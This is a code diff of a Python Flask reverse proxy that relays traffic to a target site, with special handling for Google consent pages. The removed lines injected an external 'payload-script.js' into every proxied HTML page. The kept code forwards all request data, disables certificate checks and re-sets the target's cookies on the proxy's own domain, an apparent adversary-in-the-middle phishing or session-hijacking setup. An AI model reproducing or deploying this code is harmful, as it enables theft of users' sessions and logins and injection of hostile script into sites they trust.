@@ -79,70 +79,27 @@ def start_proxy(target, host, port, secret):
             headers = {k: v for k, v in headers.items() if k.lower() not in excluded_headers}
             headers['Host'] = target
 
-            # Handle POST data
-            data = None
-            if request.method == 'POST':
-                if request.is_json:
-                    data = request.get_json()
-                elif request.form:
-                    data = request.form.to_dict()
-                else:
-                    data = request.get_data()
-
-                # Special handling for consent form
-                if 'consent.google.com' in target_url or 'gen_204' in path:
-                    headers['Content-Type'] = request.headers.get('Content-Type', 'application/x-www-form-urlencoded')
-                    if isinstance(data, dict):
-                        import urllib.parse
-                        data = urllib.parse.urlencode(data)
-
-            # Forward the request
+            # Forward the request with original data
             resp = session.request(
                 method=request.method,
                 url=target_url,
                 headers=headers,
-                data=data,
+                data=request.get_data(),
                 cookies=request.cookies,
-                allow_redirects=False,
+                allow_redirects=True,
                 verify=False,
-                timeout=10
+                timeout=30
             )
 
-            # Handle redirects manually
-            if resp.status_code in [301, 302, 303, 307, 308]:
-                location = resp.headers.get('Location', '')
-                if location.startswith('http'):
-                    location = '/' + location.split('/', 3)[-1]
-                return Response('', resp.status_code, {'Location': location})
-
-            # Special handling for 204 responses
-            if resp.status_code == 204:
-                return Response('', 204, [(k, v) for k, v in resp.headers.items() 
-                                        if k.lower() not in ['content-encoding', 'content-length']])
-
-            # Process response
-            content = resp.content
-            if 'text/html' in resp.headers.get('Content-Type', '').lower():
-                try:
-                    content = content.decode()
-                    payload = '<script src="/payload-script.js"></script>'
-                    if '</head>' in content:
-                        content = content.replace('</head>', f'{payload}</head>')
-                    elif '<body>' in content:
-                        content = content.replace('<body>', f'<body>{payload}')
-                    content = content.encode()
-                except:
-                    pass
-
-            # Create response
+            # Create response with original status code
             response = Response(
-                content,
+                resp.content,
                 resp.status_code,
                 [(k, v) for k, v in resp.headers.items() 
                  if k.lower() not in ['content-encoding', 'content-length', 'transfer-encoding']]
             )
 
-            # Handle cookies
+            # Copy all cookies from response
             for cookie in resp.cookies:
                 response.set_cookie(
                     key=cookie.name,
@@ -150,8 +107,7 @@ def start_proxy(target, host, port, secret):
                     domain=request.host,
                     path='/',
                     secure=cookie.secure,
-                    httponly=cookie.has_nonstandard_attr('HttpOnly'),
-                    samesite='Lax'
+                    httponly=cookie.has_nonstandard_attr('HttpOnly')
                 )
 
             return response
